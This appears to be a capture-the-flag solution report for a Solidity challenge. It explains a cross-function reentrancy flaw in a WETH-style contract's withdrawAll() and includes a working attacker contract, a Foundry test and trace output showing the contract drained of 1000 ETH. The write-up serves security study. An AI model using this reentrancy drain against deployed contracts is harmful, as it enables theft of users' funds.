# Challenge 2: Mission Modern WETH - Solution Report

## Problem Overview

### Contract Summary

The challenge revolves around the `ModernWETH` contract, which is an implementation of Wrapped Ether (WETH) with potential vulnerabilities. The main functionalities include:

- `deposit()`: Allows users to deposit ETH and receive mWETH tokens.
- `withdraw(uint256 wad)`: Enables users to burn mWETH tokens and receive ETH.
- `withdrawAll()`: Allows users to burn all their mWETH tokens and receive the corresponding ETH.

### Initial Setup

- The `ModernWETH` contract is deployed with an initial balance of 1000 ETH, deposited by a whale address.
- The whitehat hacker (attacker) starts with an initial balance of 10 ETH.

### Success Criteria

To successfully complete the challenge, the following conditions must be met:

- The `ModernWETH` contract's balance should be reduced to 0 ETH.
- The whitehat hacker's final balance should be 1010 ETH (initial 10 ETH + 1000 ETH rescued from the contract).

## Vulnerability

The vulnerability in the `ModernWETH` contract lies in the `withdrawAll()` function. The function contains a cross-function reentrancy vulnerability due to improper state management. The vulnerable code is as follows:

```solidity
function withdrawAll() external nonReentrant {
    (bool success,) = msg.sender.call{value: balanceOf(msg.sender)}("");
    require(success, "mWETH: ETH transfer failed");

    _burnAll();
}
```

The vulnerability arises because:

1. The function sends ETH to the caller before burning the mWETH tokens.
2. The `nonReentrant` modifier prevents direct reentrancy within the same function, but it doesn't prevent cross-function reentrancy.
3. The `_burnAll()` function is called after the ETH transfer, allowing an attacker to manipulate their token balance before it's burned.

This order of operations creates a window where an attacker can receive ETH without their mWETH balance being immediately reduced. By exploiting this vulnerability, an attacker can repeatedly call `withdrawAll()` and manipulate their mWETH balance, effectively draining the contract's ETH reserves without losing an equivalent amount of mWETH tokens.

## Attack Process

The attack exploits the cross-function reentrancy vulnerability in the `ModernWETH` contract. The process involves the following steps:

1. Deploy an attacker contract (`ModernWETHAttack`) that interacts with the `ModernWETH` contract.

2. The attacker contract deposits a small amount of ETH (e.g., 10 ETH) into the `ModernWETH` contract to receive mWETH tokens.

3. The attacker contract calls the `withdrawAll()` function of `ModernWETH`.

4. When `ModernWETH` sends ETH to the attacker contract, it triggers the `receive()` function in the attacker contract.

5. Inside the `receive()` function, the attacker contract immediately transfers the received mWETH tokens to the owner (whitehat) address. This prevents the tokens from being burned in the subsequent `_burnAll()` call.

6. The `withdrawAll()` function in `ModernWETH` completes, burning the attacker contract's mWETH balance, which is now zero.

7. Steps 3-6 are repeated in a loop until the `ModernWETH` contract's ETH balance is drained.

8. The attacker contract returns the initial deposit to the owner.

9. Finally, the whitehat (owner) calls `withdrawAll()` on the `ModernWETH` contract to convert all accumulated mWETH tokens into ETH.

This process allows the attacker to continuously withdraw ETH from the `ModernWETH` contract while preserving their mWETH balance. Each iteration increases the amount of mWETH tokens held by the whitehat, which can ultimately be converted back to ETH, effectively draining the entire contract.

## Proof of Concept (PoC)

### Core Implementation

The core of the attack is implemented in the `ModernWETHAttack` contract:

```solidity
contract ModernWETHAttack {
    ModernWETH public modernWETH;
    address public owner;

    constructor(ModernWETH _modernWETH) {
        modernWETH = _modernWETH;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        uint256 depositAmount = msg.value;

        while (modernWETH.balanceOf(owner) + depositAmount <= address(modernWETH).balance) {
            modernWETH.deposit{value: depositAmount}();
            modernWETH.withdrawAll();
        }

        (bool success,) = payable(owner).call{value: depositAmount}("");
        require(success, "Transfer back failed");
    }

    receive() external payable {
        modernWETH.transfer(owner, msg.value);
    }
}
```

The attack is executed in the `testWhitehatRescue()` function of the `Challenge2Test` contract:

```solidity
function testWhitehatRescue() public {
    vm.startPrank(whitehat, whitehat);

    ModernWETHAttack attacker = new ModernWETHAttack(modernWETH);
    attacker.attack{value: 10 ether}();
    modernWETH.withdrawAll();

    vm.stopPrank();

    assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
    assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
}
```

### Running Result

```
Ran 1 test for test/Challenge2.t.sol:Challenge2Test
[PASS] testWhitehatRescue() (gas: 4158538)
Traces:
  [5203438] Challenge2Test::testWhitehatRescue()
    ├─ [0] VM::startPrank(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA])
    │   └─ ← [Return]
    ├─ [246111] → new ModernWETHAttack@0x987B1cb2d9309b71A0390B8e70fA90A865dC4E27
    │   └─ ← [Return] 1007 bytes of code
    ├─ [4895879] ModernWETHAttack::attack{value: 10000000000000000000}()
    │   ├─ [2563] ModernWETH::balanceOf(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [29362] ModernWETH::deposit{value: 10000000000000000000}()
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ModernWETHAttack: [0x987B1cb2d9309b71A0390B8e70fA90A865dC4E27], value: 10000000000000000000 [1e19])
    │   │   └─ ← [Stop]
    │   ├─ [38862] ModernWETH::withdrawAll()
    │   │   ├─ [23683] ModernWETHAttack::receive{value: 10000000000000000000}()
    │   │   │   ├─ [22994] ModernWETH::transfer(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], 10000000000000000000 [1e19])
    │   │   │   │   ├─ emit Transfer(from: ModernWETHAttack: [0x987B1cb2d9309b71A0390B8e70fA90A865dC4E27], to: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], value: 10000000000000000000 [1e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Transfer(from: ModernWETHAttack: [0x987B1cb2d9309b71A0390B8e70fA90A865dC4E27], to: 0x0000000000000000000000000000000000000000, value: 0)
    │   │   └─ ← [Stop]

// ...
// 99 remaining transfers of 10 mWETH to whitehat
// ...

    │   ├─ [563] ModernWETH::balanceOf(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [0] whitehat::fallback{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [13179] ModernWETH::withdrawAll()
    │   ├─ [0] whitehat::fallback{value: 1000000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ emit Transfer(from: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], to: 0x0000000000000000000000000000000000000000, value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
```
